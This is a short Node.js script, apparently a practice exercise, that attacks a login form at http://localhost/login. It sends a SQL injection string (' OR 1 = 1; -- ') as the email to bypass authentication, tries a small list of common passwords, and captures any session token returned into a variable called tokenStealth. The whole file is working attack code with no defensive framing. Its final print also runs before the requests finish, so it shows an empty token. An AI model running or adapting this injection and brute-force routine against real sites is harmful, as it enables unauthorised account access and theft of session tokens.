const fetch = require('node-fetch');

// step 1

// script brute force using javascript!

let tokenStealth = '';

const email = `' OR 1 = 1; -- '`;  // bypass email
const trials = ['admin', 'user', 'cook', 'furry', '123', '1234'];

for (let pass of trials)
{
(async function(email, pass) {
const response = await fetch("http://localhost/login", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,id;q=0.8",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundary0TwUMXk9SWzvvWwn",
  },
  "body": `------WebKitFormBoundary0TwUMXk9SWzvvWwn\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n${email}\r\n------WebKitFormBoundary0TwUMXk9SWzvvWwn\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n${pass}\r\n------WebKitFormBoundary0TwUMXk9SWzvvWwn--\r\n`,
  "method": "POST",
});

return response.status == 200 ? await response.json() : null;
})(email, pass).then((e) => {

console.log(e);
tokenStealth = e?.data?.token ?? tokenStealth;
})
}

console.log('token', tokenStealth);

